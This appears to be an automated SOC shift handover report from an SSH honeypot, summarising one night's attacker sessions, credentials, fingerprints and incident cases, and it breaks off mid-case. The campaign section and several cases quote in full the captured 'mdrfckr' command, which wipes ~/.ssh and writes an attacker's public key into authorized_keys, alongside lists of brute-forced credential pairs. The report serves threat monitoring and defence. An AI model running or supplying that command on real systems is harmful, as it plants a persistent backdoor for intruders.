# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-30 |
| **Generated At** | 2026-10-30T03:25:35Z |
| **Shift Time** | 03:25 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **90** |
| Confirmed Threats | **74** |
| False Positives Filtered | **16** (17.8%) |
| Unique Attacker IPs | **62** |
| Countries of Origin | **24** |
| High Severity Cases | **46** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **44** |
| Malware Samples Analyzed | **9** HIGH · **25** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **87** |
| Unique Credential Pairs | **34** |
| Unique Usernames | **19** |
| Unique Passwords | **29** |
| Successful Auth Pairs | **78** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 20 |
| `345gs5662d34` | 13 |
| `support` | 13 |
| `nikita` | 4 |
| `admin` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 13 |
| `3245gs5662d34` | 11 |
| `support` | 7 |
| `supportAtlanta` | 6 |
| `abcd1234` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 13 |
| `support` | `support` | 7 |
| `root` | `3245gs5662d34` | 6 |
| `support` | `supportAtlanta` | 6 |
| `admin` | `admin` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `nikita` | `123` | `162.214.124.247` | 2026-10-30T00:11:45 |
| `345gs5662d34` | `345gs5662d34` | `162.214.124.247` | 2026-10-30T00:11:47 |
| `nikita` | `3245gs5662d34` | `162.214.124.247` | 2026-10-30T00:11:47 |
| `invitado` | `invitado` | `180.168.24.186` | 2026-10-30T00:13:03 |
| `345gs5662d34` | `345gs5662d34` | `180.168.24.186` | 2026-10-30T00:13:07 |
| `invitado` | `3245gs5662d34` | `180.168.24.186` | 2026-10-30T00:13:08 |
| `ubuntu` | `123456Aa` | `106.75.26.244` | 2026-10-30T00:14:17 |
| `root` | `Test@2020` | `87.106.63.76` | 2026-10-30T00:14:59 |
| `345gs5662d34` | `345gs5662d34` | `87.106.63.76` | 2026-10-30T00:15:01 |
| `root` | `3245gs5662d34` | `87.106.63.76` | 2026-10-30T00:15:02 |
| `nikita` | `123` | `103.248.120.6` | 2026-10-30T00:17:25 |
| `345gs5662d34` | `345gs5662d34` | `103.248.120.6` | 2026-10-30T00:17:28 |
| `nikita` | `3245gs5662d34` | `103.248.120.6` | 2026-10-30T00:17:31 |
| `root` | `Test@2020` | `102.88.137.145` | 2026-10-30T00:19:45 |
| `345gs5662d34` | `345gs5662d34` | `102.88.137.145` | 2026-10-30T00:19:49 |
| `root` | `3245gs5662d34` | `102.88.137.145` | 2026-10-30T00:19:50 |
| `root` | `Test@2020` | `125.22.69.166` | 2026-10-30T00:21:06 |
| `345gs5662d34` | `345gs5662d34` | `125.22.69.166` | 2026-10-30T00:21:11 |
| `root` | `3245gs5662d34` | `125.22.69.166` | 2026-10-30T00:21:13 |
| `root` | `Nintendo1` | `129.121.136.201` | 2026-10-30T00:21:16 |
_… 58 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **90** |
| Sessions with Fingerprint | **12** |
| Unique HASSH Fingerprints | **12** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 35 |
| Go SSH scanner | 6 |
| OpenSSH | 4 |
| Perl Net::SSH | 2 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 23 | 12 |
| `1f2f2f9b0a73...` | Mirai/variant | 6 | 3 |
| `390ffe68a68c...` | Modern SSH client | 4 | 2 |
| `03a80b21afa8...` | Modern SSH client | 2 | 1 |
| `eff4c24daffc...` | Modern SSH client | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 23 | 12 | Mirai/variant |
| `1f2f2f9b0a73...` | libssh | 6 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 4 | 3 | — |
| `390ffe68a68c...` | OpenSSH | 4 | 2 | Modern SSH client |
| `03a80b21afa8...` | libssh | 2 | 1 | Modern SSH client |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `3c0eaacec19b...` | Perl Net::SSH | 2 | 2 | Mirai/variant |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 12 | 11 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `125.22.69.166`, `118.194.228.101`, `103.248.120.6`, `180.168.24.186`, `129.121.136.201`, `190.145.192.106`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **62** |
| Unique ASNs | **32** |
| High-Risk ASNs | **26** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 21 | HIGH |
| `AS213412` | ONYPHE SAS | 4 | LOW |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS396982` | Google LLC | 3 | LOW |
| `AS15169` | Google LLC | 3 | MEDIUM |
| `AS31898` | Oracle Corporation | 2 | HIGH |
| `AS9198` | JSC Kazakhtelecom | 1 | HIGH |
| `AS329341` | Tatu Telecom Company SEZ Limited | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (45)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-2467b789f874

| Field | Detail |
|---|---|
| **Source IP** | `162.214.124[.]247` |
| **First Seen** | 2026-10-30 00:11 |
| **Last Seen** | 2026-10-30 00:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 00:11:45` | `cowrie.session.connect` |
| `2026-10-30 00:11:45` | `cowrie.client.version` |
| `2026-10-30 00:11:45` | `cowrie.client.kex` |
| `2026-10-30 00:11:45` | `cowrie.login.success` |
| `2026-10-30 00:11:46` | `cowrie.session.params` |
| `2026-10-30 00:11:46` | `cowrie.command.input` |
| `2026-10-30 00:11:46` | `cowrie.command.failed` |
| `2026-10-30 00:11:46` | `cowrie.log.closed` |
| `2026-10-30 00:11:46` | `cowrie.session.params` |
| `2026-10-30 00:11:46` | `cowrie.command.input` |
| `2026-10-30 00:11:47` | `cowrie.session.file_download` |
| `2026-10-30 00:11:47` | `cowrie.log.closed` |
| `2026-10-30 00:11:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `162.214.124[.]247` to AbuseIPDB if not already reported
- [ ] Block `162.214.124[.]247` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c88935fa5cb

| Field | Detail |
|---|---|
| **Source IP** | `162.214.124[.]247` |
| **First Seen** | 2026-10-30 00:11 |
| **Last Seen** | 2026-10-30 00:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 00:11:47` | `cowrie.session.connect` |
| `2026-10-30 00:11:47` | `cowrie.client.version` |
| `2026-10-30 00:11:47` | `cowrie.client.kex` |
| `2026-10-30 00:11:47` | `cowrie.login.success` |
| `2026-10-30 00:11:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `162.214.124[.]247` to AbuseIPDB if not already reported
- [ ] Block `162.214.124[.]247` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91a34d0c7ec1

| Field | Detail |
|---|---|
| **Source IP** | `180.168.24[.]186` |
| **First Seen** | 2026-10-30 00:13 |
| **Last Seen** | 2026-10-30 00:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 00:13:02` | `cowrie.session.connect` |
| `2026-10-30 00:13:02` | `cowrie.client.version` |
| `2026-10-30 00:13:02` | `cowrie.client.kex` |
| `2026-10-30 00:13:03` | `cowrie.login.success` |
| `2026-10-30 00:13:04` | `cowrie.session.params` |
| `2026-10-30 00:13:04` | `cowrie.command.input` |
| `2026-10-30 00:13:04` | `cowrie.command.failed` |
| `2026-10-30 00:13:05` | `cowrie.log.closed` |
| `2026-10-30 00:13:05` | `cowrie.session.params` |
| `2026-10-30 00:13:05` | `cowrie.command.input` |
| `2026-10-30 00:13:06` | `cowrie.session.file_download` |
| `2026-10-30 00:13:06` | `cowrie.log.closed` |
| `2026-10-30 00:13:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.168.24[.]186` to AbuseIPDB if not already reported
- [ ] Block `180.168.24[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-007073f4dd3f

| Field | Detail |
|---|---|
| **Source IP** | `180.168.24[.]186` |
| **First Seen** | 2026-10-30 00:13 |
| **Last Seen** | 2026-10-30 00:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 00:13:06` | `cowrie.session.connect` |
| `2026-10-30 00:13:06` | `cowrie.client.version` |
| `2026-10-30 00:13:06` | `cowrie.client.kex` |
| `2026-10-30 00:13:07` | `cowrie.login.success` |
| `2026-10-30 00:13:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.168.24[.]186` to AbuseIPDB if not already reported
- [ ] Block `180.168.24[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cb3ef1ec63b

| Field | Detail |
|---|---|
| **Source IP** | `106.75.26[.]244` |
| **First Seen** | 2026-10-30 00:14 |
| **Last Seen** | 2026-10-30 00:18 |
| **Session Duration** | 250s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 00:14:16` | `cowrie.session.connect` |
| `2026-10-30 00:14:16` | `cowrie.client.version` |
| `2026-10-30 00:14:16` | `cowrie.client.kex` |
| `2026-10-30 00:14:17` | `cowrie.login.success` |
| `2026-10-30 00:14:18` | `cowrie.session.params` |
| `2026-10-30 00:14:18` | `cowrie.command.input` |
| `2026-10-30 00:14:18` | `cowrie.command.failed` |
| `2026-10-30 00:14:19` | `cowrie.log.closed` |
| `2026-10-30 00:18:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.75.26[.]244` to AbuseIPDB if not already reported
- [ ] Block `106.75.26[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26f407c3c4fd

| Field | Detail |
|---|---|
| **Source IP** | `87.106.63[.]76` |
| **First Seen** | 2026-10-30 00:14 |
| **Last Seen** | 2026-10-30 00:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 00:14:59` | `cowrie.session.connect` |
| `2026-10-30 00:14:59` | `cowrie.client.version` |
| `2026-10-30 00:14:59` | `cowrie.client.kex` |
| `2026-10-30 00:14:59` | `cowrie.login.success` |
| `2026-10-30 00:15:00` | `cowrie.session.params` |
| `2026-10-30 00:15:00` | `cowrie.command.input` |
| `2026-10-30 00:15:00` | `cowrie.command.failed` |
| `2026-10-30 00:15:00` | `cowrie.log.closed` |
| `2026-10-30 00:15:01` | `cowrie.session.params` |
| `2026-10-30 00:15:01` | `cowrie.command.input` |
| `2026-10-30 00:15:01` | `cowrie.session.file_download` |
| `2026-10-30 00:15:01` | `cowrie.log.closed` |
| `2026-10-30 00:15:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.63[.]76` to AbuseIPDB if not already reported
- [ ] Block `87.106.63[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5968a7511ada

| Field | Detail |
|---|---|
| **Source IP** | `87.106.63[.]76` |
| **First Seen** | 2026-10-30 00:15 |
| **Last Seen** | 2026-10-30 00:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 00:15:01` | `cowrie.session.connect` |
| `2026-10-30 00:15:01` | `cowrie.client.version` |
| `2026-10-30 00:15:01` | `cowrie.client.kex` |
| `2026-10-30 00:15:01` | `cowrie.login.success` |
| `2026-10-30 00:15:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.63[.]76` to AbuseIPDB if not already reported
- [ ] Block `87.106.63[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfd8048c0c09

| Field | Detail |
|---|---|
| **Source IP** | `103.248.120[.]6` |
| **First Seen** | 2026-10-30 00:17 |
| **Last Seen** | 2026-10-30 00:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 00:17:23` | `cowrie.session.connect` |
| `2026-10-30 00:17:23` | `cowrie.client.version` |
| `2026-10-30 00:17:24` | `cowrie.client.kex` |
| `2026-10-30 00:17:25` | `cowrie.login.success` |
| `2026-10-30 00:17:26` | `cowrie.session.params` |
| `2026-10-30 00:17:26` | `cowrie.command.input` |
| `2026-10-30 00:17:26` | `cowrie.command.failed` |
| `2026-10-30 00:17:26` | `cowrie.log.closed` |
| `2026-10-30 00:17:27` | `cowrie.session.params` |
| `2026-10-30 00:17:27` | `cowrie.command.input` |
| `2026-10-30 00:17:27` | `cowrie.session.file_download` |
| `2026-10-30 00:17:27` | `cowrie.log.closed` |
| `2026-10-30 00:17:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.248.120[.]6` to AbuseIPDB if not already reported
- [ ] Block `103.248.120[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f641166b61a9

| Field | Detail |
|---|---|
| **Source IP** | `103.248.120[.]6` |
| **First Seen** | 2026-10-30 00:17 |
| **Last Seen** | 2026-10-30 00:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 00:17:27` | `cowrie.session.connect` |
| `2026-10-30 00:17:27` | `cowrie.client.version` |
| `2026-10-30 00:17:28` | `cowrie.client.kex` |
| `2026-10-30 00:17:28` | `cowrie.login.success` |
| `2026-10-30 00:17:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.248.120[.]6` to AbuseIPDB if not already reported
- [ ] Block `103.248.120[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d07dc3e9a20

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-10-30 00:19 |
| **Last Seen** | 2026-10-30 00:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 00:19:44` | `cowrie.session.connect` |
| `2026-10-30 00:19:44` | `cowrie.client.version` |
| `2026-10-30 00:19:44` | `cowrie.client.kex` |
| `2026-10-30 00:19:45` | `cowrie.login.success` |
| `2026-10-30 00:19:46` | `cowrie.session.params` |
| `2026-10-30 00:19:46` | `cowrie.command.input` |
| `2026-10-30 00:19:46` | `cowrie.command.failed` |
| `2026-10-30 00:19:46` | `cowrie.log.closed` |
| `2026-10-30 00:19:47` | `cowrie.session.params` |
| `2026-10-30 00:19:47` | `cowrie.command.input` |
| `2026-10-30 00:19:47` | `cowrie.session.file_download` |
| `2026-10-30 00:19:47` | `cowrie.log.closed` |
| `2026-10-30 00:19:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8b0ec70d875

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-10-30 00:19 |
| **Last Seen** | 2026-10-30 00:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 00:19:48` | `cowrie.session.connect` |
| `2026-10-30 00:19:48` | `cowrie.client.version` |
| `2026-10-30 00:19:48` | `cowrie.client.kex` |
| `2026-10-30 00:19:49` | `cowrie.login.success` |
| `2026-10-30 00:19:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e072bd280769

| Field | Detail |
|---|---|
| **Source IP** | `125.22.69[.]166` |
| **First Seen** | 2026-10-30 00:21 |
| **Last Seen** | 2026-10-30 00:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 00:21:05` | `cowrie.session.connect` |
| `2026-10-30 00:21:05` | `cowrie.client.version` |
| `2026-10-30 00:21:05` | `cowrie.client.kex` |
| `2026-10-30 00:21:06` | `cowrie.login.success` |
| `2026-10-30 00:21:07` | `cowrie.session.params` |
| `2026-10-30 00:21:07` | `cowrie.command.input` |
| `2026-10-30 00:21:07` | `cowrie.command.failed` |
| `2026-10-30 00:21:08` | `cowrie.log.closed` |
| `2026-10-30 00:21:09` | `cowrie.session.params` |
| `2026-10-30 00:21:09` | `cowrie.command.input` |
| `2026-10-30 00:21:09` | `cowrie.session.file_download` |
| `2026-10-30 00:21:09` | `cowrie.log.closed` |
| `2026-10-30 00:21:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.22.69[.]166` to AbuseIPDB if not already reported
- [ ] Block `125.22.69[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04a7fe7b80c8

| Field | Detail |
|---|---|
| **Source IP** | `125.22.69[.]166` |
| **First Seen** | 2026-10-30 00:21 |
| **Last Seen** | 2026-10-30 00:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 00:21:09` | `cowrie.session.connect` |
| `2026-10-30 00:21:09` | `cowrie.client.version` |
| `2026-10-30 00:21:10` | `cowrie.client.kex` |
| `2026-10-30 00:21:11` | `cowrie.login.success` |
| `2026-10-30 00:21:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.22.69[.]166` to AbuseIPDB if not already reported
- [ ] Block `125.22.69[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3847f7cfc45

| Field | Detail |
|---|---|
| **Source IP** | `129.121.136[.]201` |
| **First Seen** | 2026-10-30 00:21 |
| **Last Seen** | 2026-10-30 00:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
